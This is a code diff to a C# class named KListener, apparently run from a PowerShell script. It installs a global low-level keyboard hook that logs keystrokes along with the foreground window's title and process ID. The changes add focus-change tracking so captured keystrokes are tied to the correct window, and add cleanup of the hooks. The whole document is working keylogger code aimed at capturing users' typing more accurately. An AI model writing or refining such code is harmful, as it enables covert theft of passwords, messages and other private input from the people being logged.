@@ -62,6 +62,32 @@ public class KListener {
     static IntPtr hhk;
     static readonly StringBuilder line = new StringBuilder(512);
     static readonly byte[] kstate = new byte[256];
+    static IntPtr origin;
+    static string originTitle = "";
+    delegate void WinEventProc(IntPtr hook, uint evt, IntPtr hwnd, int obj, int child, uint thread, uint time);
+    [DllImport("user32.dll")] static extern IntPtr SetWinEventHook(uint min, uint max, IntPtr module, WinEventProc cb, uint pid, uint tid, uint flags);
+    [DllImport("user32.dll")] static extern bool UnhookWinEvent(IntPtr hook);
+    static WinEventProc focusProc;
+    static IntPtr focusHook;
+
+    static void ResetContext(IntPtr h, string title) {
+        if (h != origin || title != originTitle) line.Clear();
+        origin = h;
+        originTitle = title;
+    }
+
+    static void ForegroundChanged(IntPtr hook, uint evt, IntPtr hwnd, int obj, int child, uint thread, uint time) {
+        line.Clear();
+        origin = IntPtr.Zero;
+        originTitle = "";
+    }
+
+    static void CheckContext() {
+        var h = GetForegroundWindow();
+        var title = new StringBuilder(256);
+        GetWindowText(h, title, 256);
+        ResetContext(h, title.ToString());
+    }
 
     static bool Down(int vk) { return (GetKeyState(vk) & 0x80) != 0; }
 
@@ -76,7 +102,8 @@ public class KListener {
     }
 
     static void Flush() {
-        var h = GetForegroundWindow();
+        CheckContext();
+        var h = origin;
         var tsb = new StringBuilder(256);
         GetWindowText(h, tsb, 256);
         uint pid; GetWindowThreadProcessId(h, out pid);
@@ -91,6 +118,7 @@ public class KListener {
 
     static IntPtr Callback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104)) {
+            CheckContext();
             var k = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
             if (k.vk == 0x08) { if (line.Length > 0) line.Length--; }
             else if (k.vk == 0x0D) {
@@ -119,11 +147,20 @@ public class KListener {
     }
 
     public static void Run() {
+        focusProc = ForegroundChanged;
+        focusHook = SetWinEventHook(3, 3, IntPtr.Zero, focusProc, 0, 0, 0);
+        if (focusHook == IntPtr.Zero) return;
         proc = Callback;
         hhk = SetWindowsHookEx(13, proc, GetModuleHandle(null), 0);
-        MSG m;
-        while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { }
-        UnhookWindowsHookEx(hhk);
+        if (hhk == IntPtr.Zero) { UnhookWinEvent(focusHook); return; }
+        try {
+            MSG m;
+            while (GetMessage(out m, IntPtr.Zero, 0, 0) > 0) { }
+        } finally {
+            UnhookWindowsHookEx(hhk);
+            UnhookWinEvent(focusHook);
+            line.Clear();
+        }
     }
 }
 '@
